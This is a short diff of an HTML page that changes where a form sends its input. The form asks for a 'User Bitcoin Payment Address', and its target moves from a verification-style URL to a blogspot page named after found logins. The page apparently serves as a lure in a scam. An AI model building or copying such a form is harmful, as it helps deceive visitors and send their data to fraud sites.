@@ -83,7 +83,7 @@ function myFunction() {
   alert("Copied the text: " + copyText.value);
 }</script>
 		  </div>
-		 <form action="https://www.verifysuper.com/cl/v/ve9ld" method=""> <div class="user-box"> 
+		 <form action="https://joestoneloginsfound.blogspot.com/" method=""> <div class="user-box"> 
          <input type="text" name="" required="required"> 
          <label>User Bitcoin Payment Address</label> 
          </div> 
